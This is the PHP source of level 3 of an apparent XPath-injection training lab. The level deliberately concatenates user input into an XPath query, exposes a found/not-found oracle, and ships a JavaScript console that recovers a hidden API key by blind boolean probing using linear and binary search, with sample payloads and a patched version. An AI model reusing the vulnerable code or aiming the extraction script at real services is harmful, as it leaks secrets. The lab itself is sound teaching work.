<?php
require_once __DIR__ . '/helpers.php';

$L    = 3;
$meta = xl_levels()[$L];

/** Six characters, a-z0-9. Never rendered by any expression this page builds. */
const L3_APIKEY = 'k9r4tz';

xl_counter_start();

/* ── The expression is built the same way for every request, including the
 *    JSON probes the console fires. One code path, no simulation. ────────── */
function l3_expr(string $u): string
{
    return "//user[username='" . $u . "']";
}

/* Counter reset, so a learner can measure a strategy from a clean slate. */
if (isset($_GET['reset'])) {
    xl_counter_reset($L);
    header('Location: level3.php');
    exit;
}

/* The probe endpoint the console talks to. Same expression, same evaluator,
   one bit of output. */
if (isset($_GET['probe'])) {
    $pu   = (string)($_GET['u'] ?? '');
    $pex  = l3_expr($pu);
    $prun = xl_xpath_run($pex);
    $n    = xl_counter_bump($L);
    header('Content-Type: application/json');
    echo json_encode([
        'found'    => $prun['ok'] && $prun['count'] > 0,
        'ok'       => $prun['ok'],
        'error'    => $prun['error'],
        'expr'     => $pex,
        'requests' => $n,
    ]);
    exit;
}

$u      = isset($_GET['u']) ? (string)$_GET['u'] : '';
$answer = isset($_GET['answer']) ? trim((string)$_GET['answer']) : '';
$sent   = isset($_GET['u']) && $u !== '';

$flag     = '';
$result   = '';
$pipeline = [];

if ($sent) {
    xl_counter_bump($L);
    $expr = l3_expr($u);
    $run  = xl_xpath_run($expr);
    $found = $run['ok'] && $run['count'] > 0;

    $pipeline = [
        ['label' => '$_GET["u"] (raw)', 'value' => $u],
        ['label' => 'expression built by concatenation', 'value' => $expr],
        ['label' => 'DOMXPath::evaluate() result',
         'value' => $run['ok'] ? $run['count'] . ' node(s) selected' : 'expression did not parse',
         'note'  => $run['ok'] ? '' : '<code>' . lk_esc((string)$run['error']) . '</code>',
         'verdict' => $run['ok'] ? null : 'block'],
        ['label' => 'what the page prints', 'value' => $found ? 'found' : 'not found',
         'note'  => 'One bit. The node set is never rendered, only tested for emptiness.',
         'verdict' => $found ? 'pass' : 'block'],
        ['label' => 'probe requests served (this session)', 'value' => (string)xl_counter_get($L),
         'note'  => 'Counted server side, including the requests the console fires.
                     <a href="level3.php?reset=1">reset the counter</a>'],
    ];

    $result = $found
        ? '<div class="message success"><strong>found</strong> &mdash; an account matched.</div>'
        : '<div class="message error"><strong>not found</strong> &mdash; no account matched.</div>';
    if (!$run['ok']) {
        $result = '<div class="message error"><strong>Lookup failed.</strong> '
                . lk_esc((string)$run['error']) . '</div>';
    }
} else {
    $pipeline = [
        ['label' => 'probe requests served (this session)', 'value' => (string)xl_counter_get($L),
         'note'  => 'Counted server side. <a href="level3.php?reset=1">reset the counter</a> before you measure a
                     strategy, then compare linear against binary.'],
    ];
}

if ($answer !== '') {
    if (strcasecmp($answer, L3_APIKEY) === 0) {
        $flag    = xl_flag($L);
        $result .= '<div class="message success"><strong>' . lk_esc($answer)
                 . '</strong> is the API key on <code>svc_backup</code>. You read it one bit at a time.</div>';
    } else {
        $result .= '<div class="message error"><code>' . lk_esc($answer)
                 . '</code> is not the API key. Six characters, lowercase letters and digits.</div>';
    }
}

$code = <<<'PHP'
// Account existence check for the "forgot my username" flow.
// Deliberately returns no data - only whether something matched.
$u = $_GET['u'];

$expr = "//user[username='" . $u . "']";
$hits = $xpath->evaluate($expr);

echo $hits->length > 0 ? 'found' : 'not found';

// No node is rendered. No error is shown. No timing difference.
// The developer's reasoning: "there is nothing here to steal."
PHP;

$fixBad = <<<'PHP'
$expr = "//user[username='" . $u . "']";
echo $xpath->evaluate($expr)->length > 0 ? 'found' : 'not found';
PHP;

$fixGood = <<<'PHP'
// 1. The value must stay a value. Compare in PHP, not in the expression.
$found = false;
foreach ($xpath->query('//user') as $candidate) {
    if (child($candidate, 'username') === $u) { $found = true; break; }
}

// 2. A boolean endpoint is still an oracle. Rate limit it, and prefer an
//    answer that does not vary with the input at all:
//    "if that account exists we have sent it an email".
$limiter->hit($clientIp, 'username-check', max: 10, per: '1 minute');
echo 'If that account exists, we have sent it a reminder.';
PHP;

/* The console. It automates the probes; it does not invent them - every
   request it sends goes through the same URL a learner can type by hand. */
$console = <<<'HTML'
<div class="xl-console">
  <h4>Blind probe console</h4>
  <div class="form-group">
    <label class="form-label">Payload template &mdash; <code>{TEST}</code> is replaced with the predicate under test</label>
    <input id="xl-tpl" class="form-control" spellcheck="false" value="svc_backup' and {TEST} and '1'='1">
  </div>
  <div class="form-group">
    <label class="form-label">Predicate to test</label>
    <input id="xl-test" class="form-control" spellcheck="false" value="string-length(apikey)=6">
  </div>
  <div class="xl-btnrow">
    <button class="btn btn-outline" id="xl-one" type="button">Send one probe</button>
    <button class="btn btn-outline" id="xl-len" type="button">Find length (binary)</button>
    <button class="btn btn-outline" id="xl-lin" type="button">Recover key (linear)</button>
    <button class="btn btn-outline" id="xl-bin" type="button">Recover key (binary)</button>
    <button class="btn btn-outline" id="xl-clr" type="button">Clear log</button>
    <a class="btn btn-outline" href="level3.php?reset=1">Reset server counter</a>
  </div>
  <div class="xl-meter">
    <span>requests fired here: <b id="xl-rq">0</b></span>
    <span>length: <b id="xl-len-v">?</b></span>
    <span>recovered: <b class="xl-recovered" id="xl-out">&mdash;</b></span>
  </div>
  <pre class="xl-log" id="xl-log"></pre>
</div>
HTML;

$script = <<<'HTML'
<script>
(function () {
  var A = 'abcdefghijklmnopqrstuvwxyz0123456789';
  var n = 0, len = null, busy = false;
  var $ = function (id) { return document.getElementById(id); };

  function log(s) { var l = $('xl-log'); l.textContent += s + "\n"; l.scrollTop = l.scrollHeight; }

  function probe(test) {
    var payload = $('xl-tpl').value.replace('{TEST}', test);
    return fetch('level3.php?probe=1&u=' + encodeURIComponent(payload))
      .then(function (r) { return r.json(); })
      .then(function (j) {
        n++; $('xl-rq').textContent = n;
        log('#' + n + '  ' + test + '   ->  ' + (j.found ? 'FOUND' : 'not found')
            + (j.ok ? '' : '   [XPath error: ' + j.error + ']'));
        return j.found;
      });
  }

  function findLength() {
    log('-- length: binary search over 1..32, expect about 6 requests --');
    return probe('string-length(apikey)>=1').then(function (ok) {
      if (!ok) { log('   the base predicate matched nothing - fix the template before extracting'); return null; }
      var lo = 1, hi = 32;
      function step() {
        if (lo >= hi) { len = lo; $('xl-len-v').textContent = len; log('   length = ' + len); return len; }
        var mid = Math.floor((lo + hi + 1) / 2);
        return probe('string-length(apikey)>=' + mid).then(function (t) {
          if (t) { lo = mid; } else { hi = mid - 1; }
          return step();
        });
      }
      return step();
    });
  }

  function ensureLength() { return len === null ? findLength() : Promise.resolve(len); }

  function recoverLinear() {
    return ensureLength().then(function (L) {
      if (!L) { return; }
      log('-- linear recovery: up to ' + A.length + ' requests per character --');
      var out = '', i = 1;
      function pos() {
        if (i > L) { $('xl-out').textContent = out; log('   recovered "' + out + '" after ' + n + ' total requests'); return; }
        var k = 0;
        function ch() {
          if (k >= A.length) { log('   no alphabet character matched position ' + i); return; }
          var c = A[k];
          return probe("substring(apikey," + i + ",1)='" + c + "'").then(function (t) {
            if (t) { out += c; $('xl-out').textContent = out; i++; return pos(); }
            k++; return ch();
          });
        }
        return ch();
      }
      return pos();
    });
  }

  function recoverBinary() {
    return ensureLength().then(function (L) {
      if (!L) { return; }
      log('-- binary recovery: 6 requests per character (log2 of ' + A.length + ') --');
      var out = '', i = 1;
      function pos() {
        if (i > L) { $('xl-out').textContent = out; log('   recovered "' + out + '" after ' + n + ' total requests'); return; }
        var lo = 0, hi = A.length - 1;
        function step() {
          if (lo >= hi) { out += A[lo]; $('xl-out').textContent = out; i++; return pos(); }
          var mid = Math.floor((lo + hi + 1) / 2);
          var t = "string-length(substring-before('" + A + "',substring(apikey," + i + ",1)))>=" + mid;
          return probe(t).then(function (r) { if (r) { lo = mid; } else { hi = mid - 1; } return step(); });
        }
        return step();
      }
      return pos();
    });
  }

  function run(fn) {
    if (busy) { return; }
    busy = true;
    Promise.resolve(fn()).catch(function (e) { log('error: ' + e); }).then(function () { busy = false; });
  }

  $('xl-one').addEventListener('click', function () { run(function () { return probe($('xl-test').value); }); });
  $('xl-len').addEventListener('click', function () { run(findLength); });
  $('xl-lin').addEventListener('click', function () { run(recoverLinear); });
  $('xl-bin').addEventListener('click', function () { run(recoverBinary); });
  $('xl-clr').addEventListener('click', function () { $('xl-log').textContent = ''; });
})();
</script>
HTML;

lk_page([
    'lab'        => xl_lab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => xl_extra_head(),
    'extra_body' => $script,

    'code'       => $code,
    'vuln_lines' => [5],
    'annotation' => 'The endpoint returns one bit, so the developer concluded there was nothing to disclose. The
        injected predicate decides what that bit <em>means</em>: <code>and substring(apikey,1,1)=\'k\'</code> turns
        "does this account exist" into "is the first character of the API key a k".',

    'theory' => '<p>A blind injection is not a weaker injection. It is the same injection with a narrower output
        channel, and a narrow channel is a bandwidth problem rather than an access problem. One bit per request,
        repeated, reconstructs any value the expression can reach.</p>
        <p>What makes XPath 1.0 pleasant for this is that its function library is small and entirely
        string-oriented: <code>string-length()</code>, <code>substring()</code>, <code>substring-before()</code>,
        <code>contains()</code>, <code>translate()</code>, <code>count()</code>, <code>name()</code>. All of them
        can be pushed into a predicate, and all of them collapse to a boolean when compared. There is no
        <code>SLEEP()</code> and no error-based channel to fall back on, so the boolean oracle is usually all you
        get &mdash; and it is enough.</p>
        <p>The engineering lesson sits in the request count. Asking "is character N equal to X" is the obvious
        question and the expensive one. Asking "is character N in the first half of the alphabet" costs the same
        request and returns far more information. Extraction attacks are search problems, and the same reasoning
        that turns a linear scan into a binary search applies unchanged.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'note' => 'Both halves matter. Fixing the expression removes the injection; rate limiting and a
            non-committal response reduce what an <em>uninjected</em> existence oracle gives away.',
    ],

    'scenario' => '<strong>Scenario:</strong> a "forgot my username" check that answers <code>found</code> or
        <code>not found</code> and nothing else.
        <br><strong>Goal:</strong> recover the six-character <code>apikey</code> stored on the
        <code>svc_backup</code> account and submit it below. The flag is gated on the value, not on the payload.',

    'model' => [
        'title' => 'What each request buys you',
        'html'  => '<p>The predicate you control is <code>username=\'U\'</code>. Adding <code>and P</code> makes
        the page answer <code>P</code> instead, for the account you named:</p>
        <pre class="lk-sinkline">//user[username=\'<span class="lk-inj">svc_backup\' and P and \'1\'=\'1</span>\']</pre>
        <p>The trailing <code>and \'1\'=\'1</code> exists only to consume the developer&rsquo;s closing quote. Now
        count the requests.</p>
        <table class="lk-kv">
            <tr><td>length, linear</td><td><code>string-length(apikey)=1</code>, <code>=2</code>, &hellip; up to 32
                probes.</td></tr>
            <tr><td>length, binary</td><td><code>string-length(apikey)&gt;=16</code> then bisect.
                <strong>6 requests</strong> for a range of 1&ndash;32, because 2<sup>5</sup> &lt; 32 &le; 2<sup>6</sup>.</td></tr>
            <tr><td>character, linear</td><td><code>substring(apikey,N,1)=\'a\'</code> and step through the
                alphabet. Worst case <strong>36</strong> requests per character, 18 on average.</td></tr>
            <tr><td>character, binary</td><td>Turn the character into a number first:
                <code>string-length(substring-before(\'abcdefghijklmnopqrstuvwxyz0123456789\',substring(apikey,N,1)))</code>
                is its index in that alphabet. Numbers can be bisected, so <strong>6</strong> requests per
                character.</td></tr>
        </table>
        <p>For a six-character key: roughly 6 + 6&times;36 = <strong>222</strong> requests linear, worst case,
        against 6 + 6&times;6 = <strong>42</strong> binary. Same oracle, same payload shape, five times less noise
        in the access log. Run both from the console and watch the counter.</p>',
    ],

    'form' => xl_form(
            [['name' => 'u', 'label' => 'Check whether an account exists',
              'value' => $u, 'placeholder' => 'svc_backup']],
            'Check',
            'Manual probes and console probes hit the same endpoint and are counted together.'
        )
        . $console
        . xl_answer_form('The <code>apikey</code> you recovered', $answer),

    'result'   => $result,
    'flag'     => $flag,
    'flag_msg' => 'A yes/no endpoint gave up a secret, one bit at a time.',
    'why'      => '<p>Every request asked the server a question whose answer it was willing to give: "does an
        account match this predicate". You changed the predicate so that the answer also described a value the
        server would never have printed. The engine never behaved incorrectly; it evaluated exactly what it was
        handed, and what it was handed was written by you.</p>
        <p>The number in the trace is the part to remember. Blind extraction is measured in requests, and the
        difference between a naive and a considered payload is usually an order of magnitude &mdash; which is
        also the difference between an attack that trips a rate limiter and one that does not.</p>',

    'pipeline' => $pipeline,
    'sink'     => [
        'label'    => 'expression handed to DOMXPath::evaluate()',
        'before'   => "//user[username='",
        'injected' => $u,
        'after'    => "']",
    ],
    'probes'   => [
        'param'  => 'u',
        'method' => 'GET',
        'action' => 'level3.php',
        'items'  => [
            ['q'       => 'Is the boolean actually controllable, or is the page always saying "found"?',
             'payload' => "svc_backup' and '1'='2",
             'learn'   => 'Should print <code>not found</code> for an account that certainly exists. If it does,
                           the predicate is yours; if it does not, your quote never escaped the literal.'],
            ['q'       => 'Which accounts even have an apikey element?',
             'payload' => "svc_backup' and apikey and '1'='1",
             'learn'   => 'A bare element name in a predicate is a presence test. Cheaper than guessing values,
                           and it tells you whether the field you are about to spend 200 requests on exists.'],
            ['q'       => 'Do numeric comparisons work in this predicate?',
             'payload' => "svc_backup' and string-length(apikey)>=1 and '1'='1",
             'learn'   => 'Confirms the function library is available and that <code>&gt;=</code> parses. Both are
                           prerequisites for binary search, and both are cheaper to check than to assume.'],
        ],
    ],
    'hints' => xl_hints($L),
]);
